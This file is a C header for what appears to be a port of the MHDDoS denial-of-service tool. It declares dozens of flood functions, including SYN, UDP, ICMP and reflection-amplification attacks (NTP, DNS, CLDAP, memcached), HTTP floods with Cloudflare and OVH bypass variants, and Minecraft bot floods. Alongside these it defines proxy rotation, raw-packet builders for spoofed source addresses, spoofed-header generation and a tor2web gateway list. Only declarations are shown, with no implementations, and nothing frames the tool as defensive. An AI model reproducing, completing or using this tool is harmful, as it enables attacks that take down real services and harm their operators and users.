#ifndef MHDDOS_H
#define MHDDOS_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdint.h>
#include <stdatomic.h>
#include <math.h>
#include <ctype.h>
#include <uuid/uuid.h>

#define VERSION "2.4 SNAPSHOT"
#define MAX_THREADS 10000
#define MAX_PROXIES 100000
#define MAX_REFS 10000
#define MAX_LINE 4096
#define MAX_USERAGENTS 1000
#define MAX_REFERERS 1000
#define MAX_PACKET 65535
#define MCBOT_PREFIX "MHDDoS_"
#define MINECRAFT_DEFAULT_PROTOCOL 47

#define BCOLORS_HEADER "\033[95m"
#define BCOLORS_OKBLUE "\033[94m"
#define BCOLORS_OKCYAN "\033[96m"
#define BCOLORS_OKGREEN "\033[92m"
#define BCOLORS_WARNING "\033[93m"
#define BCOLORS_FAIL "\033[91m"
#define BCOLORS_RESET "\033[0m"
#define BCOLORS_BOLD "\033[1m"
#define BCOLORS_UNDERLINE "\033[4m"

typedef enum {
    PROXY_NONE = 0,
    PROXY_HTTP = 1,
    PROXY_SOCKS4 = 4,
    PROXY_SOCKS5 = 5,
    PROXY_RANDOM = 6
} proxy_type_t;

typedef struct {
    char host[256];
    int port;
    proxy_type_t type;
} proxy_t;

typedef struct {
    char host[256];
    int port;
    char path[2048];
    char authority[512];
    char scheme[16];
    char raw_path_qs[2048];
    char human_repr[4096];
    char raw_authority[512];
    char raw_host[256];
} url_t;

typedef enum {
    METHOD_TCP, METHOD_UDP, METHOD_SYN, METHOD_ICMP,
    METHOD_VSE, METHOD_TS3, METHOD_MCPE, METHOD_FIVEM,
    METHOD_FIVEM_TOKEN, METHOD_OVH_UDP, METHOD_MINECRAFT,
    METHOD_CPS, METHOD_CONNECTION, METHOD_MCBOT,
    METHOD_MEM, METHOD_NTP, METHOD_DNS_AMP, METHOD_ARD,
    METHOD_CLDAP, METHOD_CHAR, METHOD_RDP,
    METHOD_GET, METHOD_POST, METHOD_CFB, METHOD_BYPASS,
    METHOD_OVH, METHOD_STRESS, METHOD_DYN, METHOD_SLOW,
    METHOD_HEAD, METHOD_NULL, METHOD_COOKIE, METHOD_PPS,
    METHOD_EVEN, METHOD_GSB, METHOD_DGB, METHOD_AVB,
    METHOD_CFBUAM, METHOD_APACHE, METHOD_XMLRPC, METHOD_BOT,
    METHOD_BOMB, METHOD_DOWNLOADER, METHOD_KILLER, METHOD_TOR,
    METHOD_RHEX, METHOD_STOMP,
    METHOD_UNKNOWN
} method_t;

typedef struct {
    char target_ip[256];
    int target_port;
    method_t method;
    int protocolid;
    proxy_t *proxies;
    int proxy_count;
    char **refs;
    int ref_count;
    volatile int *running;
    char local_ip[64];
    uint8_t amp_payload[256];
    int amp_payload_len;
    int amp_port;
} layer4_args_t;

typedef struct {
    url_t target;
    char host_ip[256];
    method_t method;
    int rpc;
    int thread_id;
    proxy_t *proxies;
    int proxy_count;
    char **useragents;
    int useragent_count;
    char **referers;
    int referer_count;
    volatile int *running;
    SSL_CTX *ssl_ctx;
    char local_ip[64];
} layer7_args_t;

extern atomic_long REQUESTS_SENT;
extern atomic_long BYTES_SEND;
extern char g_local_ip[64];

static const char *tor2webs[] = {
    "onion.city", "onion.cab", "onion.direct", "onion.sh",
    "onion.link", "onion.ws", "onion.pet", "onion.rip",
    "onion.plus", "onion.top", "onion.si", "onion.ly",
    "onion.my", "onion.sh", "onion.lu", "onion.casa",
    "onion.com.de", "onion.foundation", "onion.rodeo",
    "onion.lat", "tor2web.org", "tor2web.fi",
    "tor2web.blutmagie.de", "tor2web.to", "tor2web.io",
    "tor2web.in", "tor2web.it", "tor2web.xyz", "tor2web.su",
    "darknet.to", "s1.tor-gateways.de", "s2.tor-gateways.de",
    "s3.tor-gateways.de", "s4.tor-gateways.de",
    "s5.tor-gateways.de"
};
#define TOR2WEB_COUNT 35

void do_exit(const char *msg);
void get_local_ip(char *buf, int buflen);
int tools_send(int sock, const uint8_t *packet, int len);
int tools_sendto(int sock, const uint8_t *packet, int len, struct sockaddr_in *addr);
void safe_close(int sock);
void rand_bytes(uint8_t *buf, int len);
void rand_str(char *buf, int len);
void rand_ipv4(char *buf, int buflen);
int rand_int(int min, int max);
char *rand_choice_str(char **arr, int count);

int mc_varint(int d, uint8_t *out);
int mc_data(const uint8_t *payload, int plen, uint8_t *out);
int mc_short(int integer, uint8_t *out);
int mc_long(int64_t integer, uint8_t *out);
int mc_handshake(const char *host, int port, int version, int state, uint8_t *out);
int mc_handshake_forwarded(const char *host, int port, int version, int state, const char *ip, const char *uuid_str, uint8_t *out);
int mc_login(int protocol, const char *username, uint8_t *out);
int mc_keepalive(int protocol, int64_t num_id, uint8_t *out);
int mc_chat(int protocol, const char *message, uint8_t *out);

void *layer4_thread(void *arg);
void *layer7_thread(void *arg);

void flood_tcp(layer4_args_t *args);
void flood_udp(layer4_args_t *args);
void flood_syn(layer4_args_t *args);
void flood_icmp(layer4_args_t *args);
void flood_vse(layer4_args_t *args);
void flood_ts3(layer4_args_t *args);
void flood_mcpe(layer4_args_t *args);
void flood_fivem(layer4_args_t *args);
void flood_fivem_token(layer4_args_t *args);
void flood_ovhudp(layer4_args_t *args);
void flood_minecraft(layer4_args_t *args);
void flood_cps(layer4_args_t *args);
void flood_connection(layer4_args_t *args);
void flood_mcbot(layer4_args_t *args);
void flood_amp(layer4_args_t *args);

void flood_get(layer7_args_t *args);
void flood_post(layer7_args_t *args);
void flood_head(layer7_args_t *args);
void flood_pps(layer7_args_t *args);
void flood_even(layer7_args_t *args);
void flood_ovh(layer7_args_t *args);
void flood_null(layer7_args_t *args);
void flood_cookie(layer7_args_t *args);
void flood_apache(layer7_args_t *args);
void flood_xmlrpc(layer7_args_t *args);
void flood_stress(layer7_args_t *args);
void flood_bot(layer7_args_t *args);
void flood_dyn(layer7_args_t *args);
void flood_slow(layer7_args_t *args);
void flood_cfbuam(layer7_args_t *args);
void flood_avb(layer7_args_t *args);
void flood_downloader(layer7_args_t *args);
void flood_rhex(layer7_args_t *args);
void flood_stomp(layer7_args_t *args);
void flood_gsb(layer7_args_t *args);
void flood_bypass(layer7_args_t *args);
void flood_cfb(layer7_args_t *args);
void flood_dgb(layer7_args_t *args);
void flood_tor(layer7_args_t *args);
void flood_killer(layer7_args_t *args);

method_t parse_method(const char *s);
const char *method_to_str(method_t m);
int is_layer4(method_t m);
int is_layer7(method_t m);
int is_amp(method_t m);
int check_raw_socket(void);
void parse_url(const char *raw, url_t *u);
void humanbytes(long i, char *buf, int buflen);
void humanformat(long num, char *buf, int buflen);
uint16_t ip_checksum(void *vdata, size_t length);
void build_ip_header(struct iphdr *iph, const char *src, const char *dst, int protocol, int total_len);
void build_tcp_syn(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip, int src_port, int dst_port);
void build_icmp_echo(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip, int data_len);
void build_udp_raw(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip, int src_port, int dst_port, const uint8_t *data, int data_len);

int open_connection_l4(const char *ip, int port, proxy_t *proxies, int proxy_count);
int open_connection_l7(layer7_args_t *args, SSL **ssl_out);

void generate_spoof_headers(char *buf, int buflen);
void generate_l7_payload(layer7_args_t *args, const char *extra, char *buf, int buflen);
const char *get_method_type_str(method_t m);

int load_lines(const char *path, char ***lines, int max_lines);
int load_proxies(const char *path, proxy_t *proxies, int max_proxies, proxy_type_t type);

#endif
